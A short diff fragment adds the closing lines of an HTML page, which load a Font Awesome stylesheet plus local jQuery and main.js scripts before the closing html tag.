+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+
+
+</html>
